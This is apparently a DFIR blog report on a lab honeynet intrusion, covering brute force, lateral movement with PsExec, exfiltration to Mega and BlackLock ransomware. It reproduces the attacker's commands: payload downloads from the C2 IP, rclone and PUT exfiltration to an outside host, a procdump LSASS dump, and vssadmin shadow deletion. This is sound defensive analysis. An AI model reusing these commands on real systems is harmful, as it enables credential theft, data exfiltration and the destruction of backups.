---
title: Nine - Honeynet Collapse - DeceptiTech DFIR Report
date: 2026-02-27 01:00:00 +0530
categories: [Days of Security, Digital Forensics, Windows, TryHackMe]
tags: [Digital Forensics]
---

## Case Summary
The intrusion began near the end of June 2025 when a threat actor was able to compromise a poorly configured wordpress honeypot on a Linux server in the organization's DMZ network. The threat actor was able to perform remote code execution(RCE) by modifying the 404 page on the web app after brute-forcing the credentials for wordpress login.  
The threat actor was able to escalate privileges due to insecure back up of a root SSH key. Once root access was gained, attacker conducted recon activities in the DMZ zone, set up persistence using services and successfully compromised a user by finding plaintext credentials in the honeypot configuration file. Using the same credentials, attacker laterally moved to a windows server.  
3 days later, suspicious activity was observed on IT-QA windows server. The threat actor logged in with stolen credentials, added persistence through scheduled task, downloaded psexec and procdump from C2 and dumped LSASS memory to access a higher privileged user. Later the actor pivoted to the DMZ gateway server with the newly acquired credentials with the help of PsExec.  
On the Gateway host, a PsExec process was observed which further downloaded  meterpreter payload and executed with the help of rundll32. After the execution, a PowerShell child process was observed with notepad as the parent process. At the time of memory extraction, an active connection to C2 server was observed, and a connection from the gateway server to CRM server was also observed from the same process confirming lateral movement deeper into core corporate network.  
On the CRM server, various files and folders were observed, providing direct evidence of data exfiltration. Tools like 7zip, rclone, psexec were downloaded from C2 server, were renamed, and were utilised to exfiltrate data.  
Using the same method as earlier, the actor used psexec to access Domain Controller and deployed the blacklock ransomware encrypting the files on DC, the SQL databases, deleting the backups. 

### Timeline

![Attack_Timeline](/assets/honeynet-SS/DeceptiTech_Timeline.png)
### Initial Access

The first instance of unauthorized access to the network by the threat actor was observed when a poorly configured internet facing honeypot was brute forced. A sucessful logon was obsered to the beachhead host, after which a 404 wordpress page was modified to act as a gateway for remote code execution on the server.  
The attacker was also seen using a second set of credentials which were used for the rest of the attack. These were obtained on the second server i.e. SRV-IT-QA.  
The brute-force attack and initial activity originated from the IP 167[.]172[.]41[.]141 as seen in Apache logs.  

![brute_force](/assets/honeynet-initial-pot/apache2_acceslogs_hydra.png)  

After the successful brute-force attack, a backdoored 404 page in the blocksy theme was used for remote code execution(RCE). In the apache logs, the threat actor was clearly seen accessing/modifying the 404[.]php page.  

![404_access](/assets/honeynet-initial-pot/wp-corn.png)  
![backdoor](/assets/honeynet-initial-pot/backdoor_blocksy.png)  

Socat was used to upgrade to a proper shell.

![socat](/assets/honeynet-initial-pot/socat.png)

### Execution
The threat actor conducted most of the post-compromise activity through shells, initially it was socat, and on the later stages it was PowerShell with the help of PsExec.  
Metasploit payloads were downloaded from C2 and executed(meterpreter) to perform hands on keyboard attack via PsExec. This pattern was common on all internal hosts. It was evident in bash history and PowerShell transcripts.  

The threat actor observed to be scanning, downloading and executing further payload from the C2.  
![root_histry](/assets/honeynet-initial-pot/root_history.png)  
Encoded PowerShell(Meterpreter) commands on SRV-IT-QA server via scheduled task. 
![ps_history_IT-QA](/assets/honeynet-elevate-pot/remote_shell_transcript.png)  
On the DMZ-GW server, an executable was dropped and ran from the C2. More info is present in the Lateral Movement Section.  
![user_activity](/assets/honeynet-ramslation/user_activity.png)  
![rundll_exec](/assets/honeynet-ramslation/initial_cmd.png)

### Persistence
The threat actor used services and scheduled tasks as the main source of persistence.  
On the beachhead host, the threat actor created a service impersonating Kworker kernel process. It was observed to be attempting to connect to C2 server but the connection was failing.  

![persistence_beachhead](/assets/honeynet-initial-pot/kworker_service.png)  
![kworker_connection](/assets/honeynet-initial-pot/syslog_kworker_connections.png) 

For SRV-IT-QA server, the threat actor replaced the executable for a scheduled task with a metasploit payload as seen on the beachhead host.  

![persistence_IT_QA](/assets/honeynet-elevate-pot/Scheduled_Task.png)  
![persistence_File](/assets/honeynet-elevate-pot/coreinfo.png)  

### Privilege Escalation
After gaining the initial access to the beachhead honeypot server, the threat actor was able to find misplaced backup of the SSH key under the /etc/ssh/ directory for the root user.  

The threat actor enumerating the server and looking for ssh keys. Eventually finding the root key and logging in as the root user.  
![privilege_escalation_initial_pot](/assets/honeynet-initial-pot/priv_esc_initial.png)  

Post getting root access to the beachhead server, the second set of privilege escalation takes place on the SRV-IT-QA server. Using the same implant (Coreinfo64.exe) as seen in Persistence section, the threat actor gained a local Administrator shell and dumped LSASS memory to gain access to a higher privileged AD account.  

### Defense Evasion
The threat actor only cleared security event logs on all windows hosts and some PowerShell transciprtions were deleted as well. Other than that the threat actor left residual files (dump files, staging file, exfiltrated zip files, etc) on the disk itself, and did not bother clearing shell history either.  
![cleared_sec_events](/assets/honeynet-elevate-pot/logs_cleared.png)  

### Credential Access 
The threat actor was able to access the network initially through a brute force attack on the wordpress site. This, however, did not give the threat actor access to any AD user or other servers in the DMZ.  
Post getting the root access on beachhead server, the threat actor was able to find the configuration file for Deceptipot. Under ideal conditions, this file shouldn't exist on the device as seen in Deceptipot manual file.  
![deceptipot_manual](/assets/honeynet-initial-pot/deceptipot_warning.png)  

Deceptipot config contains plaintext password. The same password is being reused for multiple services, recovery key and it was the password for the AD account as well.  
![deceptipot_config](/assets/honeynet-initial-pot/decepti_config.png)  

Elevated credential were accessed on the SRV-IT-QA server. In the meterpreter session launched by the coreinfo64 payload as seen in persistence section, the threat actor dumped the LSASS process memory and downloaded the memory dump.  

LSASS memory dump was found in C:\Windows\System32 directory
![lsass_dump](/assets/honeynet-elevate-pot/memory_dump.png)  

Threat actor used the Administrator shell on SRV-IT-QA to dump the LSASS process memory with the help of procdump.  
![lsass_dump](/assets/honeynet-elevate-pot/procdump_lsass.png)  
```
Decoded commands - 

pcd.exe /accepteula -ma lsass.exe text.txt
download text.txt.dmp
```

### Discovery
After the initial access, and getting root access to the beachhead server, the threat actor performed network recon activities.  
![network_discovery](/assets/honeynet-initial-pot/root_history_discovery.png)

Discovery activity observed on CRM host 
![CRM_discovery](/assets/honeynet-CRM/all_attacker_diiscovery.png)

### Lateral Movement
Through out the attack, the threat actor extensively used PsExec to access and pivot to hosts deeper in the network. The beachhead host was only used on Day 3 to access the SRV-IT-QA server via RDP with valid credentials.  
![day_1_lateral_movement](/assets/honeynet-elevate-pot/RDP_Connection.png)  

From SRV-IT-QA to SRV-DMZ-GW and to further in to the core network, PsExec was used with the credentials of IT Administrator.  
Renamed PsExec binary in C drive.  
![psexec_c](/assets/honeynet-elevate-pot/pse.png)  

PsExec service was also installed, referencing that this server was also accessed using PsExec.  
![psexec_service](/assets/honeynet-elevate-pot/psexec.png)

Prefectch file related to PSExecsvc confirms that asusmption.  
![psexec_prefetch](/assets/honeynet-elevate-pot/prefetch_evidence3.png)

On the SRV-DMZ-GW, once again PsExec service was used to access the server. The following screenshot shows the suspicious process chain.  
![psexec_parent](/assets/honeynet-ramslation/ps_exec_parent.png)

The same child PowerShell as seen in the above screenshot was observed connecting to the CRM server.  
![crm_connection](/assets/honeynet-ramslation/lateral_movement_to_next_host.png)

### Collection
On Day 7, after gaining access to the CRM server, the threat actor collected sensitive customer information and staff information in an encrypted zip file, which was subsequently exfiltrated.  
![exfil_folder](/assets/honeynet-CRM/exfil_folder.png)  

The resulting zip file was saved in C drive.  
![exfil_data](/assets/honeynet-CRM/exfil_zip.png)

### Command and Control
From the very beginning, from brute-force to C2, the threat actor only used a single IP address 167[.]172[.]41[.]141. Various hosts were seen communicating with the C2 server in one way or another. 

Download of a suspected payload on beachhead host.  
![beachhead_c2](/assets/honeynet-initial-pot/root_history_C2.png)

Active connection of DMZ-GW host to C2.  
![DMZ_GW_C2](/assets/honeynet-ramslation/netscan_to_c2.png)  

Download of additional files utilised in data exfiltration
![CRM_C2](/assets/honeynet-CRM/all_attacker_activity.png)

The IP address itself belongs to Digital Ocean. Possible abuse of discardable VPS service to perform this specific attack.

### Exfiltration
Soon after the data was collected, the data exfiltration took place from the same CRM host only. The threat actor's PowerShell history shows exactly which tools were used and how the data was exfiltrated.  

PowerShell History  -
```
Invoke-WebRequest http:167.172.41.141/PsExec.exe -OutFile $env:TEMP\psexec.exe -UseBasicParsing
Invoke-WebRequest http://167.172.41.141/PsExec.exe -OutFile $env:TEMP\psexec.exe -UseBasicParsing
C:\Users\MATTHE~1.COL\AppData\Local\Temp\psexec.exe -accepteula -i -s powershell.exe
Invoke-WebRequest http://167.172.41.141/7z2409-x64.exe -OutFile $env:TEMP\7zz.exe -UseBasicParsing
Invoke-WebRequest http://167.172.41.141/rclone-v1.70.2-windows-amd64/rclone.exe -OutFile $env:TEMP\rclone.exe -UseBasicParsing
New-Item C:\ProgramData\sync -ItemType Directory -Force
Copy-Item $env:TEMP\7zz.exe C:\ProgramData\sync\
Copy-Item $env:TEMP\pssexec.exe C:\ProgramData\sync\
Copy-Item $env:TEMP\psexec.exe C:\ProgramData\sync\
Rename-Item $env:TEMP\rclone.exe C:\ProgramData\sync\backup_win.exe
Rename-Item $env:TEMP\rclone.exe "C:\ProgramData\sync\backup_win.exe"
```
The threat actor renamed files to masquerade them as normal windows activity. The following screenshot shows the staging folder, also includes the The crmhttp.conf used for an attempted exfiltration through PowerShell.    
![staging_folder](/assets/honeynet-CRM/staging_folder.png)  

The data was then exfiltrated to Mega with the help of rclone. Mega config contains the user credentials.   
![mega_config](/assets/honeynet-CRM/mega_config.png)  

The following commands from PS History show multiple exfiltration methods which were attempted. The first one being HTTP, second being webdav and finally a successful exfiltration through Mega.  
```
@"`
[crmremote]`
type = http`
url = http://167.172.41.141:8080`
"@ | Set-Content "C:\ProgramData\sync\\crmhttp.conf" -Encoding ASCII
& "C:\ProgramData\sync\backup_win.exe" --config "C:\ProgramData\sync\crmhttp.conf" copy C:\Exfil_Temp.7z crmremote:
@"`
[crmremote]`
type = webdav`
url = http://167.172.41.141:8080`
"@ | Set-Content "C:\ProgramData\sync\\crmhttp.conf" -Encoding ASCII
& "C:\ProgramData\sync\backup_win.exe" --config "C:\ProgramData\sync\crmhttp.conf" copy C:\Exfil_Temp.7z crmremote:
Invoke-WebRequest -Uri "http://167.172.41.141:8080/Exfil_Temp.7z"
Invoke-WebRequest -Uri "http://167.172.41.141:8080/Exfil_Temp.7z" ``
-Method Put ``
-InFile "C:\Exfil_Temp.7z" ``
-ContentType "application/octet-stream"
[System.Net.ServicePointManager]::Expect100Continue = $false
Invoke-WebRequest -Uri "http://167.172.41.141:8080/Exfil_Temp.7z" ``
-Method Put ``
-InFile "C:\Exfil_Temp.7z" ``
-ContentType "application/octet-stream"
@"`
[crmremote]`
type = mega`
user = harmlessuser98@proton.me`
pass = Wrt@5LXo6k6dum&JF9`
"@ | Out-File "C:\ProgramData\sync\mega.conf" -Encoding ASCII
& "C:\ProgramData\sync\backup_win.exe" --config "C:\ProgramData\sync\mega.conf" copy C:\Exfil_Temp.7z crmremote:DecptiTech_exfil_backups/
@"`
[crmremote]`
type = mega`
user = harmlessuser98@proton.me`
pass = & "$env:TEMP\backup_win.exe" obscure Wrt@5LXo6k6dum&JF9`
"@ | Out-File "C:\ProgramData\sync\mega.conf" -Encoding ASCII
& "C:\ProgramData\sync\backup_win.exe" --config "C:\ProgramData\sync\mega.conf" copy C:\Exfil_Temp.7z crmremote:DecptiTech_exfil_backups/
$MegaPass = (& "$env:TEMP\backup_win.exe" obscure "Wrt@5LXo6k6dum&JF9"`
)
@"`
[crmremote]`
type = mega`
user = harmlessuser98@proton.me`
pass = $MegaPass`
"@ | Out-File "C:\ProgramData\sync\mega.conf" -Encoding ASCII
& "C:\ProgramData\sync\backup_win.exe" --config "C:\ProgramData\sync\mega.conf" copy C:\Exfil_Temp.7z crmremote:DecptiTech_exfil_backups/
Remove-Item "$env:TEMP\7zz.exe" -Force
Remove-Item "$env:TEMP\backup_win.exe" -Force
Clear-RecycleBin -Force
vssadmin delete shadows /all quiet
vssadmin delete shadows /all /quiet
```

Post the final Mega exfiltration attempt, the threat actor cleaned up the residuals and deleted shadow copies to prevent recovery.  

### Impact
On Day 8. the threat actor moved laterally to the main Domain Controller of the network and accessed SQL servers as well. On these servers they deployed BlackLock ransomware payload "pb.exe" which was extracted from a "hiddenfile.zip". This zip was downloaded from gofile[.]io hosting service.

Zone ID contents displaying the download URL.  
![download_url](/assets/honeynet-SS/download_url.png)

The following artefacts were observed in the user's downloads folder. 
![download_filder](/assets/honeynet-SS/downloads_activity.png)  

Renaming the payload to make it seem legit.  
![rename_payload](/assets/honeynet-SS/file_rename.png)

Many files were observed to be encrypted.
![encryption_DC](/assets/honeynet-SS/data_encryption.png)

The following note was left on the Desktop of the host.
![ransom_note](/assets/honeynet-SS/ransom_note.png)

### Indicators

```
Initial Access and C2 
167.172.41.141

File Host
hxxps[://]store5.gofile.io/download/web/e23cb33f-0e4d-4a5f-8c55-ea2d78057d40/HiddenFile.zip

Kworker Binary
12205ef2084c6d2294faeab25bb11853a5ce7cff3a6e66dbe6c02615cec6d5ea

windows-update.exe
7bbb24444ec68f7cb9002f38351d69f2b832ce75ab4a4a6ed3719cfbb8fb7122

Coreinfo64.exe
3AE834B3D24E56A5216CA69F8210C4BA92F4315197BABEB6E34EACF06952C7DE

pcd.exe (procdump)
5B165B01F9A1395CAE79EOF85B7A1C10DC089340CF4E7BE48813AC2F8686ED61

pse.exe (psexec)
EDFAE1A69522F87B12C6DAC3225D930E4848832E3C551EE1E7D31736BF4525EF
```

### MITRE ATT&CK
![mitre_table](/assets/honeynet-SS/mitre_table.png)
